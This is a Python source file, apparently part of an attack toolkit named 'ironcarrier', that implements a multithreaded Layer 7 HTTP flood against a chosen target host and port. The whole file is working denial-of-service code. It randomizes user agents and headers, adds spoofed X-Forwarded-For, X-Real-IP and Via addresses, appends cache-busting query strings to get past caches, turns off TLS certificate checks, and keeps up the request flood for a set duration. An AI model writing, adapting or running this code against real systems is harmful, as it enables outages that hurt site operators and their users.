#!/usr/bin/env python3
"""
HTTP Flood Vector
Layer 7 HTTP flood with header randomization and cache busting
"""

import socket
import ssl
import random
import time
import threading
import string
from typing import Optional, List
from urllib.parse import urlencode
from ironcarrier.core.stats import StatsCollector


class Attack:
    """HTTP flood attack vector"""
    
    USER_AGENTS = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1',
        'Mozilla/5.0 (iPad; CPU OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/120.0.6099.119 Mobile/15E148 Safari/604.1',
        'Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 OPR/106.0.0.0',
    ]
    
    ACCEPT_HEADERS = [
        'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
        'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        '*/*',
    ]
    
    ACCEPT_LANGUAGES = [
        'en-US,en;q=0.9',
        'en-US,en;q=0.9,ru;q=0.8',
        'en-GB,en;q=0.9,en-US;q=0.8',
        'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
        'de-DE,de;q=0.9,en-US;q=0.8,en;q=0.7',
        'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7',
        'ja-JP,ja;q=0.9,en-US;q=0.8,en;q=0.7',
        'zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7',
    ]
    
    ENCODINGS = [
        'gzip, deflate, br',
        'gzip, deflate',
        'gzip, deflate, br, zstd',
    ]
    
    def __init__(self, target: str, port: int, duration: int,
                 threads: int = 100, stop_event: Optional[threading.Event] = None,
                 stats: Optional[StatsCollector] = None, **kwargs):
        self.target = target
        self.port = port
        self.duration = duration
        self.threads = threads
        self.stop_event = stop_event or threading.Event()
        self.stats = stats or StatsCollector()
        
        self.method = kwargs.get('method', 'GET').upper()
        self.path = kwargs.get('path', '/')
        self.use_ssl = kwargs.get('ssl', port == 443)
        self.keep_alive = kwargs.get('keep_alive', True)
        self.cache_bust = kwargs.get('cache_bust', True)
        self.randomize_headers = kwargs.get('randomize_headers', True)
        self.follow_redirects = kwargs.get('follow_redirects', False)
        self.timeout = kwargs.get('timeout', 5)
    
    def _random_ip(self) -> str:
        return f"{random.randint(1,223)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
    
    def _random_string(self, length: int = 8) -> str:
        return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))
    
    def _build_request(self) -> bytes:
        """Build randomized HTTP request"""
        path = self.path
        if self.cache_bust:
            sep = '&' if '?' in path else '?'
            path += f"{sep}_={random.randint(1000000000, 9999999999)}"
        
        lines = [
            f"{self.method} {path} HTTP/1.1",
            f"Host: {self.target}",
        ]
        
        if self.randomize_headers:
            lines.append(f"User-Agent: {random.choice(self.USER_AGENTS)}")
            lines.append(f"Accept: {random.choice(self.ACCEPT_HEADERS)}")
            lines.append(f"Accept-Language: {random.choice(self.ACCEPT_LANGUAGES)}")
            lines.append(f"Accept-Encoding: {random.choice(self.ENCODINGS)}")
            lines.append(f"X-Forwarded-For: {self._random_ip()}")
            
            if random.random() > 0.5:
                lines.append(f"X-Real-IP: {self._random_ip()}")
            if random.random() > 0.7:
                lines.append(f"Via: 1.1 {self._random_ip()}")
            if random.random() > 0.8:
                lines.append(f"X-Request-ID: {self._random_string(32)}")
            if random.random() > 0.6:
                lines.append(f"Referer: https://{self.target}/")
        else:
            lines.append(f"User-Agent: {self.USER_AGENTS[0]}")
            lines.append("Accept: */*")
        
        if self.keep_alive:
            lines.append("Connection: keep-alive")
        else:
            lines.append("Connection: close")
        
        request = '\r\n'.join(lines) + '\r\n\r\n'
        return request.encode('utf-8')
    
    def _create_socket(self) -> socket.socket:
        """Create socket with optional SSL"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(self.timeout)
        sock.connect((self.target, self.port))
        
        if self.use_ssl:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            ctx.set_ciphers('DEFAULT:@SECLEVEL=1')
            sock = ctx.wrap_socket(sock, server_hostname=self.target)
        
        return sock
    
    def _attack_thread(self) -> None:
        """Single attack thread"""
        end_time = time.time() + self.duration
        
        while time.time() < end_time and not self.stop_event.is_set():
            sock = None
            try:
                sock = self._create_socket()
                request = self._build_request()
                sock.sendall(request)
                self.stats.add_packets(1, len(request))
                self.stats.add_connection()
                
                if self.follow_redirects:
                    response = sock.recv(4096)
                    if b'301' in response or b'302' in response:
                        pass
                
                if not self.keep_alive:
                    sock.close()
                    sock = None
                    
            except Exception:
                self.stats.add_error()
            finally:
                if sock:
                    try:
                        sock.close()
                    except Exception:
                        pass
    
    def run(self) -> None:
        """Execute HTTP flood"""
        threads = []
        for _ in range(self.threads):
            t = threading.Thread(target=self._attack_thread, daemon=True)
            t.start()
            threads.append(t)
        
        for t in threads:
            t.join(timeout=self.duration + 5)
